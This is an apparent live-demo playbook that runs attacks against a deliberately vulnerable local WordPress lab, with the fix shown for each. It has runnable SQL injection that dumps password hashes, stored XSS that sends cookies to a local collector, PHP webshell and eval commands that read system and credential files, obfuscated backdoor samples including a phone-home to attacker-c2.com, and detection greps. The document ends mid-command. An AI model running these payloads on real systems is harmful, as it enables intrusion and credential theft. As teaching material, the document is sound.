# Attack Playbook — Demo Execution Guide

> Second-monitor cheat sheet for the live demo.  
> Each section lists: **command → attack surface → expected result → evidence**.

---

## Definitions

### Attack Vectors

| Abbreviation | Full Name | One-liner |
|---|---|---|
| — | **Enumeration** | Mapping the target without auth — usernames, versions, exposed endpoints |
| **SQLi** | SQL Injection | Injecting SQL into queries to extract/modify data the attacker shouldn't access |
| **XSS** | Cross-Site Scripting | Injecting scripts that execute in the victim's browser |
| — | XSS (Reflected) | Payload in the URL — executes when the victim clicks the link |
| — | XSS (Stored) | Payload saved to DB — executes for every visitor |
| **CSRF** | Cross-Site Request Forgery | Victim's authenticated browser is tricked into sending a forged request |
| **IDOR** | Insecure Direct Object Reference | Changing an ID parameter to access another user's data without authorization |
| **RCE** | Remote Code Execution | Attacker runs arbitrary code on the server |
| — | File Upload RCE | Uploading a script file (.php) that the server then executes |
| — | eval() RCE | User input passed directly to `eval()` → arbitrary code execution |
| **SCA** | Supply Chain Attack | Malicious code embedded in third-party plugins/themes before install |
| **OWASP** | Open Worldwide Application Security Project | Publishes the Top 10 most critical web security risks |
| **CVE** | Common Vulnerabilities and Exposures | Standardized identifier for a publicly known vulnerability |
| **CVSS** | Common Vulnerability Scoring System | 0–10 severity score for CVEs (9.8 = critical) |
| **C2** | Command & Control | Attacker-controlled server that receives stolen data / issues commands |

### WordPress & PHP Concepts

| Term | One-liner |
|---|---|
| `wp_ajax_nopriv_` | WordPress AJAX hook callable by **unauthenticated** users — dangerous if used carelessly |
| `$wpdb->prepare()` | Parameterized query — escapes input before it reaches SQL, prevents SQLi |
| `esc_html()` | Encodes HTML special chars before output — prevents XSS |
| `wp_verify_nonce()` | Validates a one-time token tied to user + action — prevents CSRF |
| `current_user_can()` | Checks capability/permission before allowing an action — prevents IDOR |
| `disable_functions` | PHP INI directive that blacklists dangerous functions (`system`, `exec`, `passthru`…) |
| `open_basedir` | PHP INI restriction — prevents file access outside the allowed directory tree |
| Autoload options | WordPress options loaded into RAM on **every** request, regardless of whether they're needed |
| Object cache | Redis stores DB query results in RAM — eliminates repeat SQL queries per request |
| Drop-in | A file placed in `wp-content/` that WordPress loads unconditionally (e.g. `object-cache.php`) |
| Nonce | "Number used once" — a short-lived signed token that ties a form submission to a specific user and action |

---

## Section 1: Enumeration & Fingerprinting

**OWASP A07 — Security Misconfiguration / Identification and Authentication Failures**

### [1.1] Username enumeration via author archives

```bash
curl -s -I 'http://localhost:8080/?author=1' | grep -i location
```

- **Attack surface**: WordPress redirects `/?author=1` to `/author/admin/`, leaking the username in the URL
- **Expected result**: `Location: http://localhost:8080/author/admin/`

Now sweep IDs 1–100 to find all users:

```bash
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://localhost:8080/?author=$i")
  if [[ "$code" == "301" ]]; then
    user=$(curl -s -I "http://localhost:8080/?author=$i" | grep -i location | sed 's|.*/author/||;s|/.*||' | tr -d '\r')
    echo "id=$i → $user (301 redirect)"
  elif [[ "$code" == "200" ]]; then
    user=$(curl -s "http://localhost:8080/?author=$i" | grep -o '<title>[^<]*</title>' | sed 's/<title>//;s/ &#8211;.*//;s/<\/title>//')
    echo "id=$i → $user (200 archive)"
  fi
done
```

- **Expected result**:
  ```
  id=1 → admin (301 redirect)
  id=2 → editor (200 archive)
  id=3 → author (200 archive)
  id=4 → subscriber (200 archive)
  ```
- **Evidence**: All 4 usernames extracted. Users with published posts get a 301 leaking the name in the `Location` header; others return 200 and the username appears in the HTML `<title>` tag. Non-existent IDs return 404 and are skipped

### [1.2] Username enumeration via REST API

```bash
curl -s 'http://localhost:8080/wp-json/wp/v2/users' | python3 -m json.tool
```

- **Attack surface**: WP REST API exposes user slugs, names, and avatar URLs to unauthenticated requests by default
- **Expected result**: JSON array with user objects including `slug`, `name`, `link`
- **Evidence**: Returns `"slug": "admin"`, `"name": "admin"`, full Gravatar URLs — complete user list without authentication

### [1.3] WordPress version disclosure

```bash
curl -s 'http://localhost:8080' | grep 'generator'
```

- **Attack surface**: `<meta name="generator">` tag in page source reveals the exact WP version
- **Expected result**: Version number in HTML meta tag
- **Evidence**: `<meta name="generator" content="WordPress 6.9" />` — attacker knows exactly which CVEs to try:
  - WPScan DB: https://wpscan.com/wordpresses/
  - NVD: https://nvd.nist.gov/vuln/search#/nvd/home?keyword=wordpress%206.9&resultType=records

### [1.4] Debug info endpoint (vulnerable plugin)

```bash
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_debug_info' | python3 -m json.tool
```

- **Attack surface**: Public AJAX endpoint exposes server internals without authentication
- **Expected result**: JSON with PHP version, server software, OS, loaded extensions, active plugins, DB prefix, ABSPATH, WP_DEBUG state
- **Evidence**: Returns PHP 8.3.20, Apache/2.4.62, Linux kernel version, 43 loaded PHP extensions (incl. `mysqli`, `redis`, `imagick`), active plugins, `db_prefix: "wp_"`, `wp_debug: true`. Complete server fingerprint

**Why this happens so easily in WordPress:**

WordPress has two AJAX hook types:
```php
add_action('wp_ajax_my_action', ...);         // authenticated users only
add_action('wp_ajax_nopriv_my_action', ...);  // ← everyone, including strangers
```
A developer adds `nopriv_` to test during development, forgets to remove it, ships to production. One line of code, millions of sites exposed.

**Real-world examples:**
- **RevSlider — CVE-2014-9734**: `nopriv_` endpoint leaked arbitrary files incl. `wp-config.php`; SoakSoak botnet hit 100K+ sites in one weekend.
- **WP Query Console — 2024**: `nopriv_` AJAX handler accepted raw PHP eval — same pattern as `vuln_calculator`. ([Patchstack](https://patchstack.com/database/wordpress/plugin/wp-query-console/vulnerability/wordpress-wp-query-console-plugin-1-0-remote-code-execution-rce-vulnerability))

> **Takeaway:** One-word typo (`nopriv_`) — always audit `wp_ajax_nopriv_` registrations in plugins.

### [1.5] Login error username disclosure

```bash
curl -s -d 'log=admin&pwd=wrongpassword' 'http://localhost:8080/wp-login.php' | grep -i 'error\|incorrect\|invalid' | head -3
```

- **Attack surface**: WordPress login form confirms whether a username exists before checking the password
- **Expected result**: Error message that specifically mentions the username
- **Evidence**: `The password you entered for the username <strong>admin</strong> is incorrect.` — confirms the username exists, enabling targeted brute-force

---

## Section 2: SQL Injection

**OWASP A03 — Injection**

### [2.1] Normal search (legitimate use)

```bash
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=Welcome' | python3 -m json.tool
```

- **Attack surface**: `vuln_search` action concatenates user input directly into a SQL query string (no `$wpdb->prepare()`)
- **Expected result**: Posts matching "Welcome" plus the raw SQL query in the response
- **Evidence**: Returns `"query_executed": "SELECT ID, post_title, post_content FROM wp_posts WHERE post_title LIKE '%Welcome%' AND post_status = 'publish'"` — response reveals the exact query, showing the injection point

**Why this is so common in WordPress plugins — the vulnerable pattern:**

```php
// ❌ VULNERABLE — string concatenation
$q = $_GET['q'];
$results = $wpdb->get_results(
    "SELECT * FROM wp_posts WHERE post_title LIKE '%$q%'"
);

// ✅ FIXED — parameterized query
$results = $wpdb->get_results(
    $wpdb->prepare("SELECT * FROM wp_posts WHERE post_title LIKE %s", '%' . $wpdb->esc_like($q) . '%')
);
```

> **CVE-2024-2879 (CVSS 9.8)** — LayerSlider 1M+ installs: `id` param concatenated into SQL, no auth → full `wp_users` dump. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-2879)

### [2.2] Boolean-based SQLi

```bash
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1%27+OR+%271%27%3D%271' | python3 -m json.tool
```

- **Attack surface**: Single quote breaks out of the string literal
- **Expected result**: Query shows the injected `OR '1'='1'` condition in the SQL
- **Evidence**: `"query_executed": "...LIKE '%1' OR '1'='1%'..."` — input is injected verbatim into SQL

### [2.3] UNION-based SQLi — credential dump 💀

```bash
curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1'+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-" | python3 -m json.tool
```

- **Attack surface**: UNION injection appends a second SELECT that reads from `wp_users`
- **Expected result**: All usernames, bcrypt password hashes, and email addresses
- **Evidence**:
  - `admin` → `$P$B.SB9meQjCS5Msb1P4Zfim/itrTJpw0` → `admin@demo.local`
  - `editor` → `$P$BoVuPi5.gAmUilxdQvlEQZ5xcn..0f/` → `editor@demo.local`
  - `author` → `$P$BvGW8diFZsf38lo2lXukHo5lHuNYe4/` → `author@demo.local`
  - `subscriber` → `$P$Bv2hGy.WswoCQgl1xjoBIRxqw66gsp/` → `subscriber@demo.local`
  - These phpass hashes can be cracked offline with `hashcat -m 400`

### [2.4] FIXED version — parameterized query ✅

```bash
curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search_fixed&q=1'+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-" | python3 -m json.tool
```

- **Attack surface**: Same payload against the fixed endpoint
- **Expected result**: Empty results, no injection
- **Evidence**: `"results": []`, `"security": "Query uses $wpdb->prepare() with parameterized placeholders"` — the `'` is escaped, UNION treated as literal text

---

## Section 3: Cross-Site Scripting (XSS)

**OWASP A03 — Injection (client-side)**

### [3.1] Reflected XSS — script in URL

**Step 1 — Open this in the browser (the "innocent" version):**
```
http://localhost:8080/?vuln_search_page=1&q=hello
```
Browser shows: `You searched for: hello` — looks totally normal.

**Step 2 — The definitive "wow" payload (text + red page, no JS, nothing to block):**
```
http://localhost:8080/?vuln_search_page=1&q=<h1>HACKED</h1><style>body{background:red;color:white}h1{font-size:5em}</style>
```
The page turns red, all text turns white, and a giant "HACKED" heading appears. Zero JavaScript. Zero quotes. `+` is URL-encoding for space — safe in any browser, copy-paste safe from any terminal.

> ⚠️ **Why not `<script>alert()`?** Firefox and Chrome suppress `alert()` on `localhost` silently. `<script>` payloads with string literals (single quotes) also break when copy-pasted from a terminal — the shell escapes them to `\'red\'`, producing a JavaScript SyntaxError. Avoid for live demos.

**Step 3 — Proof of JavaScript execution (confirms it's not just CSS injection):**
```
http://localhost:8080/?vuln_search_page=1&q=<img src=x onerror=this.ownerDocument.body.style.background=this.id id=red>
```
No quotes anywhere. The broken `<img>` fires `onerror`, which reads its own `id="red"` attribute as a string and assigns it to `background`. Page turns red — **only possible via JavaScript**. The console will show `GET http://localhost:8080/x 404` confirming the `src=x` triggered the handler.

> 💡 **Use Step 2 for the visual impact, Step 3 to prove it's actual script execution.**

**Step 4 — Real-world impact: silent cookie theft (use the stored XSS C2):**

Skip the reflected URL for this — use the guestbook **stored XSS** from Section 3.2 instead. It's already injected and fires automatically when any admin page loads. Check the loot:
```bash
curl -s 'http://localhost:9090/loot' | python3 -m json.tool
```

**Why it works — the vulnerable code in `class-xss-demo.php`:**
```php
$query = $_GET['q'];  // raw user input, no sanitization

// VULNERABILITY: two injection points in one page
echo '<p>You searched for: ' . $query . '</p>';              // ← script executes here
echo '<input type="text" name="q" value="' . $query . '">'; // ← attribute injection here
```
The `$query` variable is pasted verbatim into the HTML. The browser receives a page where `<script>` is already part of the server's response — it cannot distinguish it from code the developer wrote.

**The fix — one function call:**
```php
echo '<p>You searched for: ' . esc_html($query) . '</p>';
// renders as: &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
// shown as text, never executed
```

**Reflected vs. Stored — key difference:**
- **Reflected**: payload lives in the URL. Victim must click the attacker's crafted link. Gone after the request.
- **Stored** (Section 3.2): payload is saved in the database. Executes for every visitor on every page load — no link needed.

> **CVE-2022-1329 (CVSS 8.8)** — Elementor 5M+ installs: reflected XSS in onboarding wizard, subscriber → admin session hijack. Root cause: `$_GET` echoed without `esc_html()`.

### [3.2] Stored XSS — cookie-stealing guestbook

```bash
curl -s --data-urlencode 'message=<script>fetch(`http://localhost:9090/steal?c=${document.cookie}`)</script>' \
     -d 'action=vuln_guestbook_submit&name=Hacker' \
     'http://localhost:8080/wp-admin/admin-ajax.php'
```

- **Attack surface**: Guestbook stores user input without sanitization. When admin views entries, the stored `<script>` executes in their browser session
- **Expected result**: HTTP 302 (redirect after submit), script persisted in database
- **Evidence**: Payload stored. Then as logged-in admin, visit:
  ```
  http://localhost:8080/wp-admin/admin.php?page=vuln-demo
  ```
  The page renders guestbook entries unsanitized — the `<script>` fires and exfiltrates the session cookie to `:9090`

> ⚠️ **Why backticks?** `curl -d` decodes `+` as a space (URL form encoding), breaking `"..."+document.cookie`. WordPress also slashes `'` and `"` via `wp_magic_quotes()`. Backtick template literals `` `${document.cookie}` `` have no quotes to escape and no `+` needed. Use `--data-urlencode` so curl doesn't mangle the value.

### [3.3] Stored XSS — img tag variant (filter bypass)

```bash
curl -s --data-urlencode 'message=<img src=x onerror=fetch(`http://localhost:9090/steal?c=${document.cookie}`)//' \
     -d 'action=vuln_guestbook_submit&name=Normal+User' \
     'http://localhost:8080/wp-admin/admin-ajax.php'
```

- **Attack surface**: Uses `<img onerror>` instead of `<script>` — bypasses naive tag-name filters
- **Expected result**: Image fails to load, `onerror` handler fires
- **Evidence**: Demonstrates that XSS filtering on tag name alone is insufficient

### [3.4] Check stolen cookies on attacker C2

```bash
curl -s 'http://localhost:9090/loot' | python3 -m json.tool
```

- **Attack surface**: Flask C2 server at `:9090` collects exfiltrated data
- **Expected result**: JSON array with stolen cookie values
- **Evidence**: Empty until admin visits `http://localhost:8080/wp-admin/admin.php?page=vuln-demo` in browser. During live demo: will contain `wordpress_logged_in_*` session cookies

---

## Section 4: CSRF (Cross-Site Request Forgery)

**OWASP A01 — Broken Access Control**

### [4.1] CSRF — change admin email

```
Open demos/csrf-attack.html in browser while logged into WP
```

- **Attack surface**: `vuln_change_email` AJAX action has no nonce verification. Any website can craft a hidden form that submits to this endpoint — browser auto-includes admin's session cookie
- **Expected result**: Admin's email is silently changed when they visit the attacker's page
- **Evidence**: `csrf-attack.html` contains a hidden auto-submitting form targeting `admin-ajax.php?action=vuln_change_email`. No nonce = no CSRF protection. Fix uses `wp_verify_nonce()`

---

## Section 5: IDOR (Insecure Direct Object Reference)

**OWASP A01 — Broken Access Control**

### [5.1] Enumerate all users (no auth required)

```bash
for i in $(seq 1 100); do
  resp=$(curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_get_user&id=$i")
  if echo "$resp" | grep -q '"success":true'; then
    login=$(echo "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['login'])" 2>/dev/null)
    role=$(echo "$resp" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['role'])" 2>/dev/null)
    echo "id=$i → $login ($role)"
  fi
done
```

- **Attack surface**: `vuln_get_user` takes a user ID and returns full user data with no authentication or authorization check
- **Expected result**: Complete user records including login, email, role, registration date
- **Evidence**:
  ```
  id=1 → admin (administrator)
  id=2 → editor (editor)
  id=3 → author (author)
  id=4 → subscriber (subscriber)
  ```
  Sweeps IDs 1–100. Zero authentication — any anonymous visitor can scrape every user's login, email, and role

### [5.2] Access draft/private posts

```bash
curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_get_post&id=1' | python3 -m json.tool
```

- **Attack surface**: `vuln_get_post` returns any post by ID regardless of status (publish, draft, private, trash)
- **Expected result**: Full post content including status field
- **Evidence**: Returns content and status — works for drafts and private posts that should require authentication

**Real-world examples — identical root cause:**
- **CVE-2019-17671** — WP <5.2.4: `?static=1` bypassed post status check → unauthenticated private/draft read. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-17671)
- **CVE-2023-2986 (CVSS 9.8)** — WooCommerce Stripe 900K+ installs: `order_id` with no `current_user_can()` → full customer billing data exposed. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-2986)

**The fix — two lines:**
```php
// ❌ VULNERABLE
$post = get_post( $_GET['id'] );
return $post;

// ✅ FIXED
$post = get_post( $_GET['id'] );
if ( $post->post_status !== 'publish' && ! current_user_can( 'edit_post', $post->ID ) ) {
    wp_send_json_error( 'Access denied', 403 );
}
```

---

## Section 6: Unrestricted File Upload

**OWASP A04 — Insecure Design**

### [6.1] Create a PHP webshell inside the container

```bash
docker compose exec wordpress bash -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php"
```

- Creates the webshell in the container's `/tmp/` — nothing touches the Mac filesystem

### [6.2] Upload the webshell (from inside the container)

```bash
docker compose exec wordpress bash -c \
  "curl -s -F 'file=@/tmp/shell.php' 'http://localhost/wp-admin/admin-ajax.php?action=vuln_upload'"
```

- **Attack surface**: `vuln_upload` accepts any file without checking extension, MIME type, or content. Preserves original filename, places in web-accessible directory with PHP execution enabled
- **Expected result**: File uploaded successfully, URL returned
- **Evidence**: `{"filename":"shell.php","url":"http://localhost:8080/wp-content/uploads/vuln-demo/shell.php",...}`
- **Note**: Inside the container the WordPress port is `80` (not `8080` — that's the host mapping). The returned URL uses `localhost:8080` because WordPress's `siteurl` is configured that way.

### [6.3] Execute commands via webshell 💀

```bash
# Who am I?
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read system files
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=head+-5+/etc/passwd'
# → root:x:0:0:root:/root:/bin/bash ...

# Steal database credentials
curl -s 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=grep+DB_+/var/www/html/wp-config.php'
# → DB_NAME, DB_USER, DB_PASSWORD, DB_HOST exposed
```

- **Attack surface**: Uploaded PHP file executes arbitrary OS commands via `system($_GET["cmd"])`
- **Evidence**: Full server compromise from a single file upload

### [6.4] FIXED upload — extension whitelist ✅

```bash
docker compose exec wordpress bash -c \
  "curl -s -F 'file=@/tmp/shell.php' 'http://localhost/wp-admin/admin-ajax.php?action=vuln_upload_fixed'"
```

- **Expected result**: Rejection with extension whitelist error
- **Evidence**: `"message": "File type .php is not allowed"`, `"allowed": "jpg, jpeg, png, gif, pdf, doc, docx"`. Fix also uses `finfo` MIME validation and randomizes filename with `wp_generate_uuid4()`

### Cleanup

```bash
docker compose exec wordpress rm -f /tmp/shell.php
```

---

## Section 7: Remote Code Execution (eval)

**OWASP A03 — Injection**

### [7.1] Normal calculator use

```bash
curl -s -d 'action=vuln_calculator&expression=2%2B2' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool
```

- **Attack surface**: "Calculator" feature uses PHP `eval()` to evaluate user-provided expressions
- **Expected result**: `"result": 4`
- **Evidence**: Works as expected for math — but `eval()` executes arbitrary PHP

### [7.2] RCE — execute system commands 💀

```bash
curl -s -d 'action=vuln_calculator&expression=system(%27id%27)' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool
```

- **Attack surface**: `eval()` evaluates any PHP expression, including `system()` for OS commands
- **Expected result**: Command output from the server
- **Evidence**: `"result": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"` — arbitrary command execution

### [7.3] RCE — read wp-config.php

```bash
curl -s -d "action=vuln_calculator&expression=file_get_contents('/var/www/html/wp-config.php')" 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool
```

- **Attack surface**: `file_get_contents()` reads any file the web server can access
- **Expected result**: Contents of wp-config.php (DB credentials, auth keys, salts)

### [7.4] FIXED calculator — input validation ✅

```bash
curl -s -d 'action=vuln_calculator_fixed&expression=system(%27id%27)' 'http://localhost:8080/wp-admin/admin-ajax.php' | python3 -m json.tool
```

- **Expected result**: Rejected with validation error
- **Evidence**: `"Invalid expression. Only numbers and +, -, *, / are allowed."` — regex whitelist (`/^[0-9+\-*\/. ()]+$/`) instead of `eval()`

---

## Section 8: WPScan — Automated Scanning

### [8.1] Full enumeration scan

```bash
docker compose --profile tools run --rm wpscan --url http://wordpress --force --enumerate u,vp,vt --no-banner
```

- **Attack surface**: Automates fingerprinting, user enumeration, known vulnerability lookups, plugin/theme detection
- **Expected result**: Report listing WP version, detected plugins/themes, enumerated users, known CVEs
- **Evidence**: Everything we did manually in 7 sections — automated in seconds
- **Note**: `--force` is required because WordPress's `siteurl` is `http://localhost:8080`, so WPScan follows the redirect to a host unreachable from inside Docker and incorrectly concludes "not WordPress". `--force` skips that detection check.

### [8.2] Brute-force password attack

```bash
docker compose --profile tools run --rm wpscan --url http://wordpress --force --passwords /tmp/passwords.txt --usernames admin,editor
```

- **Attack surface**: Uses discovered usernames + wordlist to brute-force login
- **Expected result**: Cracked passwords for weak accounts
- **Evidence**: If `admin123` is in the wordlist, WPScan finds it. Demonstrates why strong passwords + rate limiting + 2FA matter

---

## Section 9: Supply Chain — Nulled Theme

**OWASP A08 — Software and Data Integrity Failures**

### [9.1] Inspect the backdoored theme

```bash
# Quick grep — spot dangerous functions in any theme
grep -rn 'eval\|base64_decode\|system\|exec\|assert\|preg_replace.*\/e' \
  themes/nulled-theme-demo/
```

- **Attack surface**: Pirated ("nulled") themes and plugins downloaded from warez sites contain injected backdoors. Developers install them to save money and hand attackers the keys.
- **Expected result**: Multiple hits — `eval`, `base64_decode`, `system` references in theme files
- **Evidence**: `functions.php` contains 3 backdoor types and `social-icons.php` contains a live webshell template

### [9.2] Walk through the three backdoor types in `functions.php`

Open `themes/nulled-theme-demo/functions.php` in the editor and walk through:

**Backdoor 1 — Obfuscated eval (license check disguise)**
```php
// Looks like a license key — is actually encoded payload
$license_check = 'YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==';
// Double-encoded base64 → decodes to: base64_decode("system($_GET['cmd'])")
// Triggered by ?license_verify= parameter
```
- Attacker sends `?license_verify=1` → code executes silently
- The variable name `$license_check` looks completely innocent

**Backdoor 2 — Hidden admin account creation**
```php
function premium_theme_check_updates() {
    // In a real nulled theme, this creates a secret admin:
    // wp_create_user('support_admin', 'h4ck3d!', 'evil@attacker.com')
    // then: $user->set_role('administrator');
}
```
- Runs on every `init` — attacker just needs to know the credentials
- Deleting the theme doesn't help: the `wp_users` row persists

**Backdoor 3 — Phone-home / data exfiltration**
```php
function premium_theme_analytics() {
    // wp_remote_post('http://attacker-c2.com/collect', ['body' => [
    //     'url'   => get_site_url(),
    //     'admin' => get_option('admin_email'),
    //     'ver'   => get_bloginfo('version'),
    // ]]);
}
```
- Fires on every admin page load — attacker instantly knows the site URL + admin email

### [9.3] Webshell hidden in template file — live demo

```bash
# The webshell is in social-icons.php, disguised as a template partial.
# It's directly web-accessible — no WordPress, no login needed.

# GET-based: hex-encoded system() call, ?cmd= parameter
curl -s 'http://localhost:8080/wp-content/themes/nulled-theme-demo/social-icons.php?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s 'http://localhost:8080/wp-content/themes/nulled-theme-demo/social-icons.php?cmd=cat+/var/www/html/wp-config.php'
# → Full wp-config.php including DB credentials and auth keys

# POST-based: base64-encoded PHP eval
# base64_decode('c3lzdGVtKCdpZCcpOw==') === "system('id');"
curl -s -X POST \
     -d 'd=c3lzdGVtKCdpZCcpOw==' \
     'http://localhost:8080/wp-content/themes/nulled-theme-demo/social-icons.php'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- **Attack surface**: The file is a standard PHP template partial — it requires no WordPress bootstrap to execute, no authentication, no nonce. Any file ending in `.php` inside a theme directory runs as PHP when requested directly via HTTP.
- **Evidence**: `id` output proves OS-level code execution. The `wp-config.php` read proves full credential exposure.
- **Why it survives deactivation**: Deactivating a theme in WordPress only changes the active theme setting in the DB. The files stay on disk. The URL works regardless of whether the theme is active.

Open `themes/nulled-theme-demo/social-icons.php` and walk through the two techniques used:

**Technique 1 — hex string for function name (evades string-based grep):**
```php
$_x = "\x73\x79\x73\x74\x65\x6d";  // hex → s,y,s,t,e,m → "system"
@$_x( $_GET['cmd'] );               // system($_GET['cmd'])
```
A `grep -r 'system'` scan finds nothing — the word "system" never appears as a string.

**Technique 2 — POST eval with base64:**
```php
// POST: d=c3lzdGVtKCdpZCcpOw==
// base64_decode('c3lzdGVtKCdpZCcpOw==') === "system('id');"
@eval( base64_decode( $_POST['d'] ) );
```
The payload travels in the POST body — it doesn't appear in web server access logs (only the URL is logged, not POST data).

**Common obfuscation techniques to recognise** (all shown in `functions.php`):

| Technique | Code | Decodes to |
|-----------|------|------------|
| Single base64 | `base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')` | `system($_GET['cmd']);` |
| Double base64 | `base64_decode('YjNOUVgz...')` → still base64 → decode again | `system($_GET['license_verify']);` |
| gzip + base64 | `gzinflate(base64_decode('S0pNLi1OL...'))` | `system($_GET['c']);` |
| Hex string | `"\x73\x79\x73\x74\x65\x6d"` | `"system"` |
| chr() building | `chr(115).chr(121).chr(115)...` | `"system"` |
| str_rot13 | `str_rot13('flfgrz')` | `"system"` |

**Real-world scale:**
- WPScan theme vulnerability database lists thousands of backdoored themes
- Nulled themes from warez sites: 100% infection rate in independent audits
- Cost: save $50 on a theme license, lose the entire site + customer data

**The fix:**
- Only install from wordpress.org or official developer websites
- Use `Theme Check` plugin before activating any theme
- Run `grep -rn 'eval\|base64_decode' wp-content/themes/` as a quick audit

---

## Block 2: DevOps Architecture

---

## Section 10: PHP Configuration — Insecure vs Hardened

### [10.1] Show current (insecure) PHP config

```bash
docker compose exec wordpress php -i | grep -E 'display_errors|expose_php|disable_functions|open_basedir|allow_url'
```

- **Expected result**: `display_errors => On`, `expose_php => On`, empty `disable_functions`, no `open_basedir`

### [10.2] Side-by-side comparison

Open `config/php-demo.ini` and `config/php-hardened.ini` side by side:

| Setting | `php-demo.ini` | `php-hardened.ini` | Impact |
|---------|---------------|-------------------|--------|
| `display_errors` | `On` | `Off` | Errors reveal file paths, DB structure, logic |
| `expose_php` | `On` | `Off` | Hides PHP version from HTTP `X-Powered-By` header |
| `disable_functions` | *(none)* | `exec,shell_exec,system,passthru,...` | Blocks OS command execution even via `eval()` |
| `open_basedir` | *(none)* | `/var/www/html:/tmp` | Prevents `file_get_contents('/etc/passwd')` |
| `allow_url_include` | *(default On)* | `Off` | Prevents Remote File Inclusion (RFI) |
| `session.cookie_httponly` | `0` | `1` | Blocks `document.cookie` in JavaScript → kills XSS cookie theft |
| `session.cookie_secure` | `0` | `1` | Forces cookies over HTTPS only |

**Key demo point:** The `disable_functions` line would have blocked the RCE demo in Section 7 — `system()` would return false even inside `eval()`.

```bash
# Show what PHP reports for the header leak
curl -s -I 'http://localhost:8080' | grep -i 'x-powered'
# → X-Powered-By: PHP/8.3.20  (with demo config — full version exposed)
```

**The fix:** In production, swap `php-demo.ini` for `php-hardened.ini` via Dockerfile or php.ini include.

---

## Section 11: Redis Object Caching

### [11.1] Check Redis is running

```bash
docker compose exec redis redis-cli ping
# → PONG
```

### [11.2] Show cache miss baseline (no cache)

```bash
# WordPress without object cache: every request = multiple SQL queries
curl -s -o /dev/null -w "Time: %{time_total}s\n" 'http://localhost:8080'

# Full Redis OFF vs ON comparison with before/after diff table:
docker compose exec wordpress wp-perf-test.sh redis
```

### [11.3] Verify Redis Object Cache status

> Redis Object Cache plugin is **pre-installed and enabled** by `wp-setup.sh` — no manual steps needed.

```bash
# Confirm the drop-in is active and connected
docker compose exec wordpress wp redis status --allow-root
```

- **Expected result**: `Status: Connected`, `Hits/Misses` ratio shown

### [11.4] Show cached data in Redis

```bash
# Count cached keys
docker compose exec redis redis-cli DBSIZE

# List what's cached
docker compose exec redis redis-cli --scan --pattern '*' | head -20
```

- **Expected result**: Keys for `options`, `user_meta`, `posts`, transients — WordPress objects cached in RAM
- **Evidence**: Subsequent page loads skip these SQL queries entirely. Critical for high-traffic sites and VPS environments with limited DB resources.

---

## Section 12: Database Hygiene

### [12.1] Autoloaded options — the most common performance killer
> Autoload options are rows in wp_options that WordPress loads into memory on every single page request — regardless of whether the current page actually needs them — making bloated or leftover plugin data a direct performance tax on every visitor



```bash
# First — see what autoload values this WP version uses (WP 6.6+ changed 'yes'/'no' → 'on'/'off'/'auto')
docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
  "SELECT autoload, COUNT(*) AS cnt FROM wp_options GROUP BY autoload ORDER BY cnt DESC;"

# Then — top 10 heaviest autoloaded options
docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
  "SELECT option_name, ROUND(LENGTH(option_value)/1024,2) AS kb, autoload FROM wp_options WHERE autoload NOT IN ('no','off','auto-off') ORDER BY LENGTH(option_value) DESC LIMIT 10;"
```

- **What to look for**: Deactivated plugins that left large serialized data in autoloaded options. These are loaded on **every single WordPress request**.
- **Note**: WordPress 6.6 changed the `autoload` column — old installs use `'yes'`/`'no'`, WP 6.6+ uses `'on'`/`'off'`/`'auto'`/`'auto-on'`/`'auto-off'`. The `NOT IN ('no','off','auto-off')` filter covers both.

### [12.2] Total autoload payload size

```bash
docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
  "SELECT ROUND(SUM(LENGTH(option_value))/1024/1024, 2) AS total_autoload_mb FROM wp_options WHERE autoload NOT IN ('no','off','auto-off');"
```

- **Expected result**: Shows total MB loaded into memory on every request. Anything over 1–2MB is a problem.

### [12.3] Expired transients and post revisions

> **Setup**: post ID 12 ("Revision Bloat Demo") was pre-seeded with **150 revisions** by `wp-setup.sh`.

```bash
docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
  "SELECT COUNT(*) AS expired_transients FROM wp_options WHERE option_name LIKE '_transient_timeout_%' AND option_value < UNIX_TIMESTAMP();"

> Expired transients are temporary cached values WordPress stored in wp_options with a TTL — their timeout timestamp has passed, but WordPress only deletes them lazily (when next accessed), so they accumulate as dead rows that still bloat every database backup and some queries.

docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
  "SELECT COUNT(*) AS total_revisions FROM wp_posts WHERE post_type='revision';"
```

- **Expected result**: `total_revisions: 150` — every save of every post is kept by default forever

### [12.4] Table sizes audit

```bash
docker compose exec db mysql -u wpuser -pwppassword --table wordpress -e \
